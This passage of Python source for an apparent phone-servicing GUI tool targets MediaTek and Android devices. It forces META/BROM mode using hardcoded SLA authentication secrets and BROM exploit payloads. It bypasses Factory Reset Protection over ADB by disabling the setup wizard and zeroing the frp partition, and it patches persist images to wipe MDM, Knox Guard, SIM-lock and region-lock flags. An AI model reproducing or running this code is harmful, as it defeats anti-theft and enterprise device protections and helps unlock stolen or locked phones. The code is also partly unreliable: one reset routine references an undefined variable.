                if vendor == 'infinix':
                    secret = b'\xC4\x92\xAD\x3A\x61\xF9\xCE\xC3\x13\x7F\xA9\xCB'
                else:
                    secret = b'\x4C\xEE\xCB\x1C\xB4\xB1\x1D\x2B\x43\x18\x84\x3F'
                timeval = resp[6:10]
                ser.write(hashlib.md5(timeval + secret).digest())

            marker, buf = _drain(ser, b'', [b'ATEM0001'])
            if marker != b'ATEM0001':
                return False
            ser.write(bytes.fromhex('040000000100000003000000'))
            marker, buf = _drain(ser, b'', [b'ATEM0002'])
            if marker != b'ATEM0002':
                return False
            ser.write(bytes.fromhex('06000000010000000300000001000000'))
            marker, buf = _drain(ser, b'', [b'ATEMATEX'])
            if marker != b'ATEMATEX':
                return False
            ser.write(b'DISCONNECT')
            return True

        port = _find_port()
        if not port:
            return False

        self.log(f'  Serial VCOM: {port} — sending {mode}...', 'h')
        ser = None
        try:
            ser = serial.Serial(port, 115200, timeout=0.3)
            ser.dtr = False
            ser.rts = False
            time.sleep(0.2)

            buf = b''
            sent = False
            end = time.time() + 15
            while time.time() < end:
                try:
                    data = ser.read(64)
                except Exception:
                    data = b''
                if data:
                    buf += data

                if b'READY' in buf:
                    if not sent:
                        ser.write(mode_bytes.get(mode, b'METAMETA'))
                        sent = True
                        buf = b''
                    else:
                        buf = b''

                if sent:
                    if b'METASLA' in buf:
                        self.log('  SLA challenge received — authenticating...', 'h')
                        if _sla_handshake(ser):
                            self.log(f'  Entered {mode} via serial VCOM + SLA!', 's')
                            return True
                        else:
                            self.log('  SLA auth failed', 'e')
                            return False
                    if b'ATEMATEM' in buf:
                        ser.write(b'\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\xC0')
                        ser.write(b'\x04\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\xC0')
                        ser.write(b'\x06\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\xC0\x00\x80\x00\x00')
                        try:
                            ser.read(13)
                        except Exception:
                            pass
                        ser.write(b'DISCONNECT')
                        self.log(f'  Entered {mode} via serial VCOM!', 's')
                        return True
                    if b'ATEMATEX' in buf or b'TOOBTSAF' in buf or b'TCAFTCAF' in buf or b'MYROTCAF' in buf:
                        ser.write(b'DISCONNECT')
                        self.log(f'  Entered {mode} via serial VCOM!', 's')
                        return True
                    if b'METAFORB' in buf:
                        self.log('  METAFORB: meta mode forbidden on this device', 'e')
                        return False
        except serial.SerialException as e:
            self.log(f'  Serial error: {e}', 'w')
            return False
        except Exception as e:
            self.log(f'  Serial error: {e}', 'w')
            return False
        finally:
            try:
                if ser:
                    ser.close()
            except Exception:
                pass
        return False

    def _meta_ensure_connected(self, mtk):
        """Scan + connect. Returns True if ready to run commands."""
        info = self._meta_scan_usb()
        pid = info.get('pid', '')

        if not info:
            self.log('  No MediaTek device found on any USB bus', 'e')
            self.log('  Check cable and drivers', 'w')
            return False

        self.log(f'  Found: {info.get("name", "MTK device")} (PID: {pid})', 's')

        # Known mode PIDs
        meta_pids = {'0003', '0001', '2007', '2008', '2009', '2010', '2011', '2012'}
        da_pids = {'2001', '200d', '2014'}
        brom_pids = {'2006', '2015', '2002', '200a'}
        preloader_pids = {'2000', '200c', '2013', '2019', '2339'}

        # Build base cmd (with --serialport if COM port known)
        def _base(suffix=None):
            """Build mtk command. Payload needs --serialport for PreLoader VCOM."""
            cmd = [mtk]
            if suffix:
                cmd += suffix
            if self._meta_com_port:
                cmd += ['--serialport', self._meta_com_port]
            return cmd
        if pid in meta_pids:
            self.log('  Device already in META mode — connected!', 's')
            return True
        if pid in da_pids:
            self.log('  Device in DA mode — connected!', 's')
            return True

        def _try_serial_with_wait():
            """Try serial VCOM, then wait for device to reboot into META mode."""
            if self._meta_enter_via_serial('METAMETA', self._meta_com_port):
                self.log('  Waiting for device to reboot into META mode...', 'h')
                for _ in range(20):
                    time.sleep(2)
                    info2 = self._meta_scan_usb()
                    pid2 = info2.get('pid', '')
                    self._meta_com_port = info2.get('com_port') or self._meta_com_port
                    if pid2 in meta_pids:
                        self.log('  Device appeared in META mode!', 's')
                        return True
                    if pid2 in da_pids:
                        self.log('  Device appeared in DA mode!', 's')
                        return True
                self.log('  Device did not appear in META mode after serial VCOM', 'w')
                return False
            return False

        if pid in brom_pids or pid in preloader_pids:
            self.log(f'  Device in BROM/Preloader — sending payload...', 'h')
            for cmd_suffix, lbl in [
                (['payload'], 'payload'),
                (['--crash', 'payload'], 'payload --crash'),
                (['payload', '--ptype', 'kamakiri'], 'kamakiri'),
                (['payload', '--ptype', 'kamakiri2'], 'kamakiri2'),
                (['payload', '--ptype', 'carbonara'], 'carbonara'),
                (['payload', '--ptype', 'amonet'], 'amonet'),
            ]:
                try:
                    cmd = _base(cmd_suffix)
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
                    if r.returncode == 0:
                        self.log(f'  Connected via {lbl}!', 's')
                        return True
                    if 'STATUS_SEC_INVALID_DA_VER' in (r.stdout + r.stderr):
                        self.log('  BROM locked — trying serial VCOM...', 'w')
                        break
                except: pass
            if _try_serial_with_wait():
                return True
            self.log('  Payload failed — try reconnecting in BROM mode', 'e')
            return False

        if info.get('serial_port') and self._meta_com_port:
            self.log(f'  PreLoader VCOM on {self._meta_com_port} — trying serial VCOM...', 'h')
            if _try_serial_with_wait():
                return True
            self.log(f'  Serial VCOM failed — trying BROM payload...', 'h')
            for cmd_suffix, lbl in [
                (['payload'], 'payload'),
                (['--crash', 'payload'], 'payload --crash'),
                (['payload', '--ptype', 'kamakiri'], 'kamakiri'),
                (['payload', '--ptype', 'kamakiri2'], 'kamakiri2'),
                (['payload', '--ptype', 'carbonara'], 'carbonara'),
                (['payload', '--ptype', 'amonet'], 'amonet'),
            ]:
                try:
                    cmd = _base(cmd_suffix)
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
                    if r.returncode == 0:
                        self.log(f'  Connected via {lbl}!', 's')
                        return True
                    if 'STATUS_SEC_INVALID_DA_VER' in (r.stdout + r.stderr):
                        self.log('  BROM locked', 'e')
                        break
                except: pass
            self.log(f'  All methods failed on {self._meta_com_port}', 'e')
            return False

        if info.get('serial_port'):
            self.log('  PreLoader VCOM detected — trying serial VCOM...', 'h')
            if _try_serial_with_wait():
                return True
            self.log('  Serial VCOM failed', 'w')
            return False

        # Device detected but wrong mode (charging-only / unknown PID) — retry loop
        self.log('', 'i')
        self.log('  Device detected but NOT in BROM/META mode', 'e')
        self.log('', 'i')
        self.log('  === OPTIONS TO ENTER META MODE ===', 'h')
        self.log('  Option A (no buttons — serial VCOM):', 'i')
        self.log('    1. DISCONNECT USB cable', 'i')
        self.log('    2. POWER OFF the phone completely', 'i')
        self.log('    3. Just CONNECT USB cable (no buttons)', 'i')
        self.log('    4. Tool auto-enters META mode via serial port', 'i')
        self.log('  Option B (BROM mode — if serial fails):', 'i')
        self.log('    1. DISCONNECT USB cable', 'i')
        self.log('    2. POWER OFF the phone completely', 'i')
        self.log('    3. Hold VOL UP + VOL DOWN together', 'i')
        self.log('    4. While holding, CONNECT USB cable', 'i')
        self.log('', 'i')
        self.log('  Retrying every 3 seconds... (max 60s)', 'w')

        import time as _t
        _serial_attempted = False
        for _attempt in range(20):
            _t.sleep(3)
            info2 = self._meta_scan_usb()
            pid2 = info2.get('pid', '')
            if pid2 in meta_pids:
                self.log('  Device entered META mode — connected!', 's')
                self._meta_com_port = info2.get('com_port')
                return True
            if pid2 in da_pids:
                self.log('  Device entered DA mode — connected!', 's')
                self._meta_com_port = info2.get('com_port')
                return True
            if pid2 in brom_pids or pid2 in preloader_pids:
                self._meta_com_port = info2.get('com_port')
                self.log(f'  Device in BROM/Preloader (PID: {pid2}) — trying BROM payload...', 'h')
                _brom_ok = False
                for cmd_suffix, lbl in [
                    (['payload'], 'payload'),
                    (['--crash', 'payload'], 'payload --crash'),
                    (['payload', '--ptype', 'kamakiri'], 'kamakiri'),
                    (['payload', '--ptype', 'kamakiri2'], 'kamakiri2'),
                    (['payload', '--ptype', 'carbonara'], 'carbonara'),
                    (['payload', '--ptype', 'amonet'], 'amonet'),
                ]:
                    try:
                        cmd = _base(cmd_suffix)
                        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
                        if r.returncode == 0:
                            self.log(f'  Connected via {lbl}!', 's')
                            return True
                        if 'STATUS_SEC_INVALID_DA_VER' in (r.stdout + r.stderr):
                            self.log('  BROM locked — trying serial VCOM...', 'w')
                            break
                    except: pass
                # Fallback: try serial VCOM
                if not _serial_attempted:
                    _serial_attempted = True
                    if self._meta_enter_via_serial('METAMETA', self._meta_com_port):
                        self.log('  Waiting for device to reboot into META mode...', 'h')
                        for _ in range(10):
                            time.sleep(3)
                            info3 = self._meta_scan_usb()
                            pid3 = info3.get('pid', '')
                            self._meta_com_port = info3.get('com_port') or self._meta_com_port
                            if pid3 in meta_pids:
                                self.log('  Device appeared in META mode!', 's')
                                return True
                            if pid3 in da_pids:
                                self.log('  Device appeared in DA mode!', 's')
                                return True
                        self.log('  Device did not appear after serial VCOM — keep waiting...', 'w')
                continue
            # Check for serial VCOM even without PID match
            if info2.get('serial_port') and not _serial_attempted:
                _serial_attempted = True
                self._meta_com_port = info2.get('com_port')
                self.log(f'  PreLoader VCOM detected — trying serial VCOM...', 'h')
                if self._meta_enter_via_serial('METAMETA', self._meta_com_port):
                    self.log('  Waiting for device to reboot into META mode...', 'h')
                    for _ in range(10):
                        time.sleep(3)
                        info3 = self._meta_scan_usb()
                        pid3 = info3.get('pid', '')
                        self._meta_com_port = info3.get('com_port') or self._meta_com_port
                        if pid3 in meta_pids:
                            self.log('  Device appeared in META mode!', 's')
                            return True
                        if pid3 in da_pids:
                            self.log('  Device appeared in DA mode!', 's')
                            return True
                    self.log('  Device did not appear after serial VCOM — keep waiting...', 'w')
            if pid2 and pid2 != pid:
                self.log(f'  Device re-detected (PID: {pid2}) — checking...', 'h')
                pid = pid2

        self.log('  Timeout — device did not enter BROM mode', 'e')
        self.log('  Try again or check USB cable/drivers', 'w')
        return False

    def _meta_wait_for_device(self, mtk, timeout=60):
        """Wait for device to appear in META/DA mode. Returns True if connected."""
        self.log('[META] Waiting for META mode device...', 'h')
        
        start_time = time.time()
        last_pid = ''
        payload_sent = False
        serial_attempted = False
        
        def _base(suffix=None):
            """Build mtk command. Payload needs --serialport for PreLoader VCOM."""
            cmd = [mtk]
            if suffix:
                cmd += suffix
            if self._meta_com_port:
                cmd += ['--serialport', self._meta_com_port]
            return cmd
        
        while time.time() - start_time < timeout:
            if getattr(self, '_mtk_cancel_flag', False):
                self.log('[META] Cancelled by user', 'w')
                return False
            
            info = self._meta_scan_usb()
            pid = info.get('pid', '').lower()
            
            if pid and pid != last_pid:
                self.log(f'  Detected: PID=0x{pid} ({info.get("name", "MTK device")})', 'i')
                last_pid = pid
            
            meta_pids = {'0003', '0001', '2007', '2008', '2009', '2010', '2011', '2012'}
            da_pids = {'2001', '200d', '2014'}
            brom_pids = {'2006', '2015', '2002', '200a'}
            preloader_pids = {'2000', '200c', '2013', '2019', '2339'}
            
            if pid in meta_pids:
                self.log('  Device in META mode — connected!', 's')
                return True
            elif pid in da_pids:
                self.log('  Device in DA mode — connected!', 's')
                return True
            elif pid in brom_pids or pid in preloader_pids:
                if not payload_sent:
                    self._meta_com_port = info.get('com_port') or self._meta_com_port
                    self.log(f'  Device in BROM/Preloader — sending payload...', 'h')
                    for cmd_suffix, lbl in [
                        (['payload'], 'payload'),
                        (['--crash', 'payload'], 'payload --crash'),
                        (['payload', '--ptype', 'kamakiri'], 'kamakiri'),
                        (['payload', '--ptype', 'kamakiri2'], 'kamakiri2'),
                        (['payload', '--ptype', 'carbonara'], 'carbonara'),
                        (['payload', '--ptype', 'amonet'], 'amonet'),
                    ]:
                        try:
                            cmd = _base(cmd_suffix)
                            r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
                            if r.returncode == 0:
                                self.log(f'  Connected via {lbl}!', 's')
                                payload_sent = True
                                time.sleep(3)
                                break
                            if 'STATUS_SEC_INVALID_DA_VER' in (r.stdout + r.stderr):
                                self.log('  BROM locked — trying serial VCOM...', 'w')
                                break
                        except: pass
                    if not payload_sent and not serial_attempted:
                        serial_attempted = True
                        if self._meta_enter_via_serial('METAMETA', self._meta_com_port):
                            self.log('  Serial VCOM succeeded — waiting for META mode...', 'h')
                            payload_sent = True
                            time.sleep(3)
                            continue
                    if not payload_sent:
                        self.log('  Payload failed — waiting for device to reconnect...', 'e')
                else:
                    self.log('  Waiting for device to enumerate in META mode...', 'i')
            elif info.get('serial_port') and not serial_attempted:
                self._meta_com_port = info.get('com_port') or self._meta_com_port
                self.log(f'  PreLoader VCOM detected — trying serial VCOM...', 'h')
                serial_attempted = True
                if self._meta_enter_via_serial('METAMETA', self._meta_com_port):
                    self.log('  Serial VCOM succeeded — waiting for META mode...', 'h')
                    payload_sent = True
                    time.sleep(3)
                    continue
            
            time.sleep(2)
        
        self.log('[META] Timeout — no META/DA device detected', 'e')
        return False

    def _meta_cmd(self, mtk, args, timeout=30):
        """Run mtk command. No --serialport — mtkclient auto-detects via USB."""
        cmd = [mtk] + args
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)

    def _meta_factory_reset(self):
        mtk = __import__('shutil').which('mtk')
        if not mtk:
            self.log('mtk tool not installed', 'e')
            return
        if not self._meta_wait_for_device(mtk):
            return
        self.log('[META] Factory reset...', 'h')
        try:
            r = self._meta_cmd(mtk, ['reset'], 30)
            o = (r.stdout + r.stderr).strip()
            if o:
                for line in o.split('\n'):
                    if line.strip():
                        self.log(f'  {line}', 'i')
            if r.returncode == 0:
                self.log('  Done', 's')
            else:
                self.log('  Failed', 'e')
        except Exception as e:
            self.log(f'  {e}', 'e')

    def _meta_reset_frp(self):
        mtk = __import__('shutil').which('mtk')
        if not mtk:
            self.log('mtk tool not installed', 'e')
            return
        if not self._meta_wait_for_device(mtk):
            return
        self.log('[META] Erase FRP...', 'h')
        try:
            r = self._meta_cmd(mtk, ['e', 'frp'], 30)
            o = (r.stdout + r.stderr).strip()
            if o:
                for line in o.split('\n'):
                    if line.strip():
                        self.log(f'  {line}', 'i')
            if r.returncode == 0:
                self.log('  Done', 's')
            else:
                self.log('  Failed', 'e')
        except Exception as e:
            self.log(f'  {e}', 'e')

    def _meta_read_device_info(self):
        mtk = __import__('shutil').which('mtk')
        if not mtk:
            self.log('mtk tool not installed', 'e')
            return
        
        if not self._meta_wait_for_device(mtk):
            return
        
        # Device connected - read comprehensive info
        self.log('[META] Reading device information...', 'h')
        
        # Build base command
        def _base(suffix=None):
            """Build mtk command. No --serialport — mtkclient auto-detects."""
            cmd = [mtk]
            if suffix:
                cmd += suffix
            return cmd
        
        info_commands = [
            ('Target Config (SBC/DAA)', ['gettargetconfig'], 15),
            ('GPT Partition Table', ['printgpt'], 15),
            ('Target Logs', ['logs'], 15),
        ]
        
        for label, args, timeout in info_commands:
            if getattr(self, '_mtk_cancel_flag', False):
                break
            try:
                self.log(f'  ── {label} ──', 'h')
                r = subprocess.run(_base(args), capture_output=True, text=True, timeout=timeout)
                output = (r.stdout + r.stderr).strip()
                if output:
                    # Log full output, not truncated
                    for line in output.split('\n'):
                        if line.strip():
                            self.log(f'    {line}', 'i')
                else:
                    self.log('    (no response)', 'm')
            except subprocess.TimeoutExpired:
                self.log(f'    Timeout', 'e')
            except Exception as e:
                self.log(f'    Error: {e}', 'e')
        
        self.log('[META] Device info read complete', 's')

    def adb_tool(self):
        self.log('ADB Tool', 'h')
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH, padx=40)
        tk.Label(cw, text='ADB TOOL', font=('Segoe UI', 22, 'bold'),
                fg=self.c['accent2'], bg=self.c['bg']).pack(pady=(30, 4))
        tk.Label(cw, text='Package manager & device utilities',
                font=('Segoe UI', 11), fg=self.c['muted'], bg=self.c['bg']).pack(pady=(0, 20))
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=60, pady=(6, 14))
        row1 = tk.Frame(cw, bg=self.c['bg'])
        row1.pack(pady=4)
        self._mkbtn(row1, 'ADB FRP Bypass',
              lambda: self._run_thread(self._adb_frp_bypass, 'ADB FRP'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        self._mkbtn(row1, 'ADB Factory Reset',
              lambda: self._run_thread(self._adb_factory_reset, 'ADB Factory Reset'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=60, pady=(6, 14))
        row2 = tk.Frame(cw, bg=self.c['bg'])
        row2.pack(pady=4)
        self._mkbtn(row2, 'Wireless ADB Pair',
              lambda: self._run_thread(self._wireless_pair, 'Wireless Pair'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        self._mkbtn(row2, 'Wireless ADB Connect',
              lambda: self._run_thread(self._wireless_connect, 'Wireless Connect'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=60, pady=(6, 14))
        row3 = tk.Frame(cw, bg=self.c['bg'])
        row3.pack(pady=4)
        self._mkbtn(row3, '📦 Push BusyBox to Device',
              lambda: self._run_thread(self._adb_push_busybox, 'BusyBox'),
              wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=60, pady=(6, 14))

    def persist_tool(self):
        self.log('Persist Partition Patcher', 'c')
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH, padx=25)

        card = tk.Frame(cw, bg=self.c['card'])
        card.pack(fill=tk.X, pady=(15, 8))
        tk.Label(card, text='PERSIST PARTITION PATCHER', font=('Segoe UI', 20, 'bold'),
                 fg=self.c['accent2'], bg=self.c['card']).pack(pady=(24, 4))
        tk.Label(card, text='Load persist, patch lock flags, save or restore backup',
                 font=('Segoe UI', 10), fg=self.c['muted'], bg=self.c['card']).pack(pady=(0, 10))
        tk.Frame(card, bg=self.c['border'], height=1).pack(fill=tk.X, padx=40, pady=(4, 14))

        self._pt_path = None
        rf = tk.Frame(card, bg=self.c['card'])
        rf.pack(fill=tk.X, padx=40, pady=6)
        tk.Label(rf, text='PERSIST:', font=('Segoe UI', 9, 'bold'),
                 fg=self.c['muted'], bg=self.c['card']).pack(side=tk.LEFT, padx=(0, 8))
        self._pt_lbl = tk.Label(rf, text='Not loaded', font=('Segoe UI', 10),
                               fg=self.c['muted'], bg=self.c['card'], anchor='w')
        self._pt_lbl.pack(side=tk.LEFT, fill=tk.X, expand=True)
        tk.Button(rf, text='LOAD FILE', font=('Segoe UI', 9, 'bold'),
                  bg=self.c['surface'], fg=self.c['accent2'],
                  activebackground=self.c['surface'], activeforeground=self.c['accent2'],
                  bd=0, padx=14, pady=4, cursor='hand2',
                  command=self._pt_load_file).pack(side=tk.RIGHT, padx=4)
        tk.Button(rf, text='PULL FROM DEVICE', font=('Segoe UI', 9, 'bold'),
                  bg=self.c['surface'], fg=self.c['blue'],
                  activebackground=self.c['surface'], activeforeground=self.c['blue'],
                  bd=0, padx=14, pady=4, cursor='hand2',
                  command=lambda: self._run_thread(self._pt_pull, 'Persist Pull')).pack(side=tk.RIGHT, padx=4)

        self._pt_status = tk.Label(card, text='', font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['card'])
        self._pt_status.pack(pady=(4, 2))

        btnf = tk.Frame(card, bg=self.c['card'])
        btnf.pack(pady=(10, 20))
        self._pt_patch_btn = tk.Button(btnf, text='PATCH & SAVE', font=('Segoe UI', 11, 'bold'),
                  bg=self.c['green'], fg='#000',
                  activebackground=self.c['green'], activeforeground='#000',
                  bd=0, padx=30, pady=8, cursor='hand2',
                  state=tk.DISABLED, command=lambda: self._run_thread(self._pt_do_patch, 'Persist Patch'))
        self._pt_patch_btn.pack(side=tk.LEFT, padx=6)
        tk.Button(btnf, text='RESTORE BACKUP', font=('Segoe UI', 11, 'bold'),
                  bg=self.c['orange'], fg='#000',
                  activebackground=self.c['orange'], activeforeground='#000',
                  bd=0, padx=30, pady=8, cursor='hand2',
                  command=lambda: self._run_thread(self._pt_do_restore, 'Persist Restore')).pack(side=tk.LEFT, padx=6)

    def _pt_load_file(self):
        path = filedialog.askopenfilename(title='Select persist image',
            filetypes=[('Persist Image', '*.img *.bin *.dump'), ('All Files', '*.*')])
        if not path: return
        self._pt_path = path
        sz = os.path.getsize(path)
        self._pt_lbl.config(text=f'{os.path.basename(path)} ({sz//1024}KB)', fg=self.c['green'])
        self._pt_status.config(text='File loaded — ready to patch', fg=self.c['green'])
        self._pt_patch_btn.config(state=tk.NORMAL)

    def _pt_pull(self):
        adb = os.path.join(self._tools_dir(), 'adb.exe')
        for p in [adb, r'C:\Program Files\platform-tools\adb.exe']:
            if os.path.isfile(p): adb = p; break
        r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
        serials = [l.split()[0] for l in r.stdout.split('\n')[1:] if l.strip() and 'device' in l]
        if not serials: self._pt_status.config(text='No device found', fg=self.c['red']); return
        s = serials[0]
        self._pt_status.config(text='Pulling persist from device...', fg=self.c['orange'])
        out = os.path.join(self._tools_dir(), 'persist_pulled.img')
        r = subprocess.run([adb, '-s', s, 'shell', 'ls -la /dev/block/by-name/persist 2>/dev/null || ls -la /dev/block/platform/*/by-name/persist 2>/dev/null'], capture_output=True, text=True, timeout=5)
        if not r.stdout.strip() or 'No such file' in r.stdout:
            self._pt_status.config(text='Persist partition not found on this device', fg=self.c['red'])
            return
        part = r.stdout.strip().split()[-1] if '/' in r.stdout else '/dev/block/by-name/persist'
        subprocess.run([adb, '-s', s, 'shell', f'dd if={part} of=/data/local/tmp/persist.img 2>/dev/null'], timeout=30)
        subprocess.run([adb, '-s', s, 'pull', '/data/local/tmp/persist.img', out], timeout=30)
        if os.path.isfile(out):
            self._pt_path = out
            sz = os.path.getsize(out)
            self._pt_lbl.config(text=f'persist_pulled.img ({sz//1024}KB)', fg=self.c['green'])
            self._pt_status.config(text='Persist pulled — ready to patch', fg=self.c['green'])
            self._pt_patch_btn.config(state=tk.NORMAL)
        else:
            self._pt_status.config(text='Failed to pull persist', fg=self.c['red'])

    def _pt_do_patch(self):
        if not self._pt_path: return
        self._pt_patch_btn.config(state=tk.DISABLED)
        self._pt_status.config(text='Scanning persist for lock flags...', fg=self.c['orange'])
        with open(self._pt_path, 'rb') as f: data = bytearray(f.read())
        fsize = len(data)
        cnt = 0
        # Persist properties stored as property_service pairs
        pats = [
            b'persist.sys.oobe', b'persist.sys.keeplocked',
            b'persist.sys.mdm', b'persist.security.',
            b'persist.mdm.', b'persist.sys.sim_locked',
            b'persist.vendor.mdm', b'persist.vendor.lock',
            b'persist.vendor.sec', b'persist.sys.trancritical',
            b'persist.vendor.transecurity', b'persist.sys.phoenix',
            b'persist.sys.cota', b'persist.sys.tne',
            b'persist.vendor.security',
        ]
        for pat in pats:
            idx = data.find(pat)
            while idx >= 0:
                c = idx + len(pat)
                if c < fsize:
                    data[idx:c] = b'\x00' * len(pat)
                    if c+1 < fsize and data[c] == 0x3D:
                        end = data.find(b'\x00', c)
                        if end < 0: end = min(c+64, fsize)
                        data[c:end] = b'\x00' * (end - c)
                cnt += 1; idx = data.find(pat, idx + len(pat))
        # Scorpio/Transsion app references in persist (NV storage contexts)
        nv_pats = [
            b'mdm_lock', b'mdm_state', b'mdm_active',
            b'lock_state', b'lock_status', b'device_locked',
            b'region_lock', b'country_lock', b'sim_lock',
            b'sim_locked', b'mdm_locked',
            b'knox_lock', b'knox_status', b'knox_guard',
            b'securitycom', b'scorpio.', b'griffin',
            b'transecurity', b'tne_service', b'phasecheck',
            b'uniber', b'tool_service', b'uniview', b'uniresctlopt',
            b'tranlog', b'tnevservice', b'trancriticalparavfy',
            b'phoenix', b'cota',
        ]
        for pat in nv_pats:
            idx = data.find(pat)
            while idx >= 0:
                data[idx:idx+len(pat)] = b'\x00' * len(pat)
                cnt += 1; idx = data.find(pat, idx + len(pat))
        # Binary lock flags at known persist offsets (Unisoc/SPD)
        _zero_regions = [
            (0x2A0000, 0x2A0048), (0x2A07F0, 0x2A0800),
            (0x1C0200, 0x1C0210), (0x1C1000, 0x1C1010),
        ]
        for zs, ze in _zero_regions:
            if ze <= fsize:
                region = data[zs:ze]
                if any(b != 0 for b in region):
                    data[zs:ze] = b'\x00' * (ze - zs)
                    cnt += 1
        # Binary MDM enable flags (0x01 at known offset = locked, 0x00 = unlocked)
        _byte_flags = [0x2A0004, 0x2A0010, 0x2A0020, 0x2A07F6]
        for off in _byte_flags:
            if off < fsize and data[off] in (0x31, 0x01):
                data[off] = 0x30; cnt += 1
        if cnt == 0:
            self._pt_status.config(text='FAILED: no lock patterns found in persist', fg=self.c['red'])
            self._pt_patch_btn.config(state=tk.NORMAL)
            return
        out = os.path.splitext(self._pt_path)[0] + '_patched.bin'
        with open(out, 'wb') as f: f.write(bytes(data))
        bak = self._pt_path + '.bak'
        if not os.path.isfile(bak):
            import shutil; shutil.copy2(self._pt_path, bak)
        self._pt_status.config(text=f'Done — {cnt} patches, saved to {os.path.basename(out)}', fg=self.c['green'])
        self._pt_patch_btn.config(state=tk.NORMAL)

    def _pt_do_restore(self):
        path = filedialog.askopenfilename(title='Select backup file',
            filetypes=[('Backup', '*.bak'), ('All Files', '*.*')])
        if not path: return
        out = os.path.join(os.path.dirname(path), 'persist_restored.img')
        import shutil; shutil.copy2(path, out)
        self._pt_status.config(text=f'Restored to {os.path.basename(out)}', fg=self.c['green'])

    def _adb_frp_bypass(self):
        self.log_section('ADB FRP Bypass', 2)
        self._run_thread(self._run_frp_bypass, 'FRP Bypass')

    def _run_frp_bypass(self):
        if not self._ensure_active(): return
        tools = self._tools_dir()
        adb = os.path.join(tools, 'adb.exe')
        for p in [adb, r'C:\Program Files\platform-tools\adb.exe']:
            if os.path.isfile(p): adb = p; break
        r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
        devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
        if not devs: self.log('No device', 'e'); return
        s = devs[0]; flags = 0x08000000
        self.log('Reading device info...', 'i')
        raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=10, creationflags=flags).stdout
        p = {}
        for line in raw.split('\n'):
            if ']: [' in line:
                k, v = line.strip()[1:].split(']: [', 1)
                p[k] = v.rstrip(']')
        def g(*keys):
            for k in keys:
                v = p.get(k, '')
                if v: return v
                try: v = subprocess.run([adb, '-s', s, 'shell', f'getprop {k}'], capture_output=True, text=True, timeout=3).stdout.strip()
                except Exception: pass
                if v: p[k] = v; return v
            return ''
        hw = [('📱', 'Model', g("ro.product.model")), ('ðŸ­', 'Brand', g("ro.product.brand")), ('📱', 'Android', g("ro.build.version.release"))]
        pass
        self.log('Bypassing FRP lock...', 'i')
        subprocess.run([adb, '-s', s, 'shell', 'settings put global device_provisioned 1'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'settings put secure user_setup_complete 1'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'settings put global development_settings_enabled 1'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'settings put global package_verifier_enable 0'], timeout=3, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'settings put global secure_frp_mode 0 2>/dev/null'], timeout=3, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'settings put global frp_lock 0 2>/dev/null'], timeout=3, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.google.android.setupwizard 2>/dev/null'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.android.setupwizard 2>/dev/null'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.sec.android.app.SecSetupWizard 2>/dev/null'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.google.android.gsf 2>/dev/null'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'pm disable-user --user 0 com.android.vending 2>/dev/null'], timeout=5, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'content insert --uri content://settings/secure --bind name:s:skip_first_use_hint --bind value:s:1 2>/dev/null'], timeout=3, creationflags=flags)
        subprocess.run([adb, '-s', s, 'shell', 'content insert --uri content://settings/secure --bind name:s:frp_lock --bind value:s:0 2>/dev/null'], timeout=3, creationflags=flags)
        # Erase FRP partition if writable
        subprocess.run([adb, '-s', s, 'shell', 'dd if=/dev/zero of=/dev/block/by-name/frp bs=1024 count=8 2>/dev/null'], timeout=5, creationflags=flags)
        self.log_ok('FRP bypass complete — reboot device')

    def _adb_factory_reset(self):
        self.log_section('ADB Factory Reset', 2)
        threading.Thread(target=self._run_adb_reset, daemon=True).start()

    def _run_adb_reset(self):
        tools = self._tools_dir()
        adb = os.path.join(tools, 'adb.exe')
        for p in [adb, r'C:\Program Files\platform-tools\adb.exe']:
            if os.path.isfile(p): adb = p; break
        r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
        devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
        if not devs: self.log('No device', 'e'); return
        s = devs[0]
        self.log('WARNING: This will wipe all device data!', 'e')
        self.log('Starting factory reset...', 'i')
        subprocess.run([adb, '-s', s, 'shell', 'am broadcast -a android.intent.action.MASTER_CLEAR 2>/dev/null'], timeout=5, creationflags=flags)
